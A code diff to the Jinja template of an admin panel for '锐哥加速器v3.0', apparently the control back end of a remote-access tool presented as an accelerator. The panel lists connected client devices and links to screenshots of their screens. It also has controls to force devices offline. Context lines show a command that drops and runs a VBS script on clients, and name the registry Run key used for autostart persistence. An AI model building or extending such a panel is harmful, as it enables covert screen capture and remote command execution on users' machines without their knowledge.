@@ -18,7 +18,7 @@
     {% endfor %}
     <h1>锐哥加速器v3.0管理后台</h1>
     <br />
-    <h4>当前在线设备数：{{ users|length }}</h4>
+    <h4>当前在线设备数：{{ count }}</h4>
     <h4>最新版本：{{ version }}&emsp;&emsp;<a href="{{ download_address }}" target="_blank">下载地址</a></h4>
     <br />
     <form action="/action" method="post" class="form-inline">
@@ -80,14 +80,25 @@
         <th>临时下线</th>
         <th>展示版本</th>
     </tr>
-    {% for i in users.keys() %}
+    {% for i in connects.keys() %}
     <tr>
-        <td>{{ i }}</td>
+        <td><a href="/message?name={{ i }}" target="_blank">{{ i }}</a></td>
         <td>{{ another_name[i] }}</td>
-        <td>{{ round(time() - users[i], 1) }}</td>
+        <td>{{ round(time() - connects[i], 1) }}</td>
         <td><a href="/static/{{ i }}.jpg" target="_blank">查看截图</a></td>
         <td><a href="/stop-once?name={{ i }}" target="_top">临时下线</a></td>
         <td><a href="/show-version?name={{ i }}" target="_top">展示版本</a></td>
+    </tr>
+    {% endfor %}
+    <tr><td></td><td></td><td></td><td></td><td></td><td></td></tr>
+    {% for i in not_connect.keys() %}
+    <tr>
+        <td><a href="/message?name={{ i }}" target="_blank">{{ i }}</a></td>
+        <td>{{ another_name[i] }}</td>
+        <td>{{ round(time() - not_connect[i], 1) }}</td>
+        <td><a href="/static/{{ i }}.jpg" target="_blank">查看截图</a></td>
+        <td></td>
+        <td></td>
     </tr>
     {% endfor %}
     </tbody>
@@ -108,6 +119,7 @@
     <p>echo msgbox "我是提示内容",64,"我是提示标题">alert.vbs && start alert.vbs && ping -n 2 127.1>nul && del alert.vbs</p>
     <h4>注册表</h4>
     <p>Software\Microsoft\Windows\CurrentVersion\Run</p>
+    <h4><a href="https://chat.yixiangzhilv.com/Rbsi" target="_blank">留言板</a></h4>
 
     <br />
     <br />
